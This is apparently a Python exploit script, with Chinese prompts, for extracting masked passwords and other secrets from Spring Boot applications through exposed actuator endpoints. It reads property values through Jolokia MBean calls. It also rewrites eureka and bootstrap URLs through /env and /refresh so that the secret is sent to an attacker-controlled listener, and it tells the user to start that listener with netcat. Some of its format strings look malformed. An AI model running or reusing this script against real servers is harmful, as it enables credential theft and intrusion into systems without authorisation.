'''
refer:https://github.com/LandGrey/SpringBootVulExploit
author:说书人
github:https://github.com/heikanet
'''

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def jolokia(url,type,key):
    headers = {'Content-Type': 'application/json'}
    if type=='1':
        try:
            data = {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin", "operation": "getProperty",
                    "type": "EXEC", "arguments": [key]}
            res=requests.post(url+'/jolokia',data=json.dumps(data),headers=headers,verify=False).json()
            if 'value' in res.keys():
                print('[+]jolokia接口1利用成功，[{}]的值为：{}'.format(key,res['value']))
            else:
                print('[-]jolokia接口1利用失败')
                data = {
                    "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
                    "operation": "getProperty", "type": "EXEC", "arguments": [key]}
                res = requests.post(url + '/jolokia', data=json.dumps(data), headers=headers, verify=False).json()
                if 'value' in res.keys():
                    print('[+]jolokia接口2利用成功，[{}]的值为：{}'.format(key, res['value']))
                else:
                    print('[-]jolokia接口2利用失败')
        except:
            print('[error]jolokia接口访问失败')
    else:
        try:
            data = {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin", "operation": "getProperty",
                    "type": "EXEC", "arguments": [key]}
            res = requests.post(url + '/actuator/jolokia', data=json.dumps(data), headers=headers,verify=False).json()
            if 'value' in res.keys():
                print('[+]jolokia接口1利用成功，[{}]的值为：{}'.format(key,res['value']))
            else:
                print('[-]jolokia接口1利用失败')
                data = {
                    "mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager",
                    "operation": "getProperty", "type": "EXEC", "arguments": [key]}
                res = requests.post(url + '/actuator/jolokia', data=json.dumps(data), headers=headers,
                                    verify=False).json()
                if 'value' in res.keys():
                    print('[+]jolokia接口2利用成功，[{}]的值为：{}'.format(key, res['value']))
                else:
                    print('[-]jolokia接口2利用失败')
        except:
            print('[error]jolokia接口访问失败')


def env(url,type,key):
    print('[*]尝试env接口')
    print('[*]先在自己控制的外网服务器上监听http端口：\n如监听80端口：nc -lvk 80')
    IpPort=input('输入监听的ip:port==>')
    if type=='1':
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        try:
            data = 'eureka.client.serviceUrl.defaultZone=http://value:${{}}@{}'.format(key, IpPort)
            requests.post(url+'/env',data=data,headers=headers,verify=False)
            requests.post(url + '/refresh', headers=headers, verify=False)
            print('[*]env接口1请求发送成功，请查看服务器是否收到请求\n若没利用成功，可选择继续利用，请保持监听正常\n1.成功   2.失败')
            IsOk=input('请选择：')
            if IsOk=='2':
                data = 'spring.cloud.bootstrap.location=http://{}}/?=${{}}'.format(IpPort,key)
                requests.post(url + '/env', data=data, headers=headers, verify=False)
                requests.post(url + '/refresh', headers=headers, verify=False)
                print('[*]env接口2请求发送成功，请查看服务器是否收到请求\n若没利用成功，可选择继续利用，请保持监听正常\n1.成功   2.失败')
                IsOk = input('请选择：')
                if IsOk == '2':
                    data = 'eureka.client.serviceUrl.defaultZone=http://{}}/${{}}'.format(IpPort, key)
                    requests.post(url + '/env', data=data, headers=headers, verify=False)
                    requests.post(url + '/refresh', headers=headers, verify=False)
                    print('[*]env接口3请求发送成功，请查看服务器是否收到请求\n若没利用成功，可以放弃了')
        except:
            print('[error]env接口访问失败')
    else:
        headers = {'Content-Type': 'application/json'}
        try:
            data = {"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${{}}@{}".format(key,IpPort)}
            requests.post(url + '/actuator/env', data=json.dumps(data), headers=headers, verify=False)
            requests.post(url + '/actuator/refresh', headers=headers, verify=False)
            print('[*]env接口1请求发送成功，请查看服务器是否收到请求\n若没利用成功，可选择继续利用，请保持监听正常\n1.成功   2.失败')
            IsOk = input('请选择：')
            if IsOk == '2':
                data = {"name":"spring.cloud.bootstrap.location","value":"http://{}/?=${{}}".format(IpPort, key)}
                requests.post(url + '/actuator/env', data=json.dumps(data), headers=headers, verify=False)
                requests.post(url + '/actuator/refresh', headers=headers, verify=False)
                print('[*]env接口2请求发送成功，请查看服务器是否收到请求\n若没利用成功，可选择继续利用，请保持监听正常\n1.成功   2.失败')
                IsOk = input('请选择：')
                if IsOk == '2':
                    data = {"name":"eureka.client.serviceUrl.defaultZone","value":"http://{}/${{}}".format(IpPort, key)}
                    requests.post(url + '/actuator/env', data=json.dumps(data), headers=headers, verify=False)
                    requests.post(url + '/actuator/refresh', headers=headers, verify=False)
                    print('[*]env接口3请求发送成功，请查看服务器是否收到请求\n若没利用成功，可以放弃了')
        except:
            print('[error]env接口访问失败')


banner='''==========Spring Boot获取被星号脱敏的密码=========='''
print(banner)
print('1.[spring 1.x版本]   2.[spring 2.x版本]')
type=input('请选择：')
key=input('输入要获取的key：')
url=input('输入url：')
jolokia(url,type,key)
env(url,type,key)